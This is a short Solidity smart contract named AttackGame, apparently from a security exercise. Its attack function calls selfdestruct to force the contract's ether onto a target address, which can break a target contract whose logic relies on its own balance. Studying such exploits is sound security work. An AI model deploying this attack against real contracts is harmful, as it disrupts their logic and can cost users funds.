// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

contract AttackGame {

    constructor() {}
    
    function attack(address payable _target) public payable {
        selfdestruct(_target);
    }
}